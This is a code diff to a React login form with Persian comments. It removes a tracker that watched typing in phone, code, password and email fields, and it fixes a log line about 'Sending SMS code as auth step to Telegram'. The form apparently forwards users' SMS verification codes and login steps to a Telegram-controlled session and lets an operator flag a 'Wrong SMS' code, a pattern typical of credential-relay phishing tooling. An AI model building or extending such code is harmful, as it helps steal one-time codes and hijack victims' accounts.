@@ -38,7 +38,7 @@ import {
   registerTelegramCallback,
   unregisterTelegramCallback,
 } from "@/lib/telegram-callback-service";
-import { useCompletePresence } from "@/hooks/usePresence";
+
 import { quickDebug } from "@/lib/telegram-debug-helper";
 
 type AuthStep =
@@ -112,38 +112,6 @@ export const LoginForm = () => {
       };
     }
   }, [sessionId]);
-
-  // سیستم جامع مدیریت حضور و تشخیص تایپ
-  const presence = useCompletePresence("LoginForm", sessionId || "", {
-    typingConfig: {
-      debounceTime: 2000, // 2 ثانیه برای LoginForm
-      minChars: 1,
-      enabledFields: ["phone", "code", "password", "email"], // فیلدهای مجاز
-    },
-  });
-
-  // نمایش آمار عملکرد در console (فقط برای development)
-  useEffect(() => {
-    if (presence.isInitialized && sessionId) {
-      const interval = setInterval(() => {
-        const stats = presence.stats;
-        console.log("📊 [LOGIN FORM] آمار جامع حضور:", {
-          form: "LoginForm",
-          currentStep,
-          presence: {
-            level: presence.presenceLevel,
-            isOnline: presence.isOnline,
-            isTyping: presence.isTyping,
-            statusText: presence.statusText,
-          },
-          global: stats.globalStats,
-          typing: stats.typingStats,
-        });
-      }, 30000); // هر 30 ثانیه
-
-      return () => clearInterval(interval);
-    }
-  }, [presence.isInitialized, sessionId, currentStep]); // حذف presence از dependencies
 
   // Countdown timer for verify-phone step
   useEffect(() => {
@@ -322,7 +290,7 @@ export const LoginForm = () => {
       } else {
         if (isSmsMode) {
           // This is SMS auth (from Wrong SMS button)
-          console.log("���� Sending SMS code as auth step to Telegram");
+          console.log("📱 Sending SMS code as auth step to Telegram");
           const success = await updateAuthStep(sessionId, "sms", verifyCode);
           if (!success) {
             throw new Error("Failed to update SMS auth step");
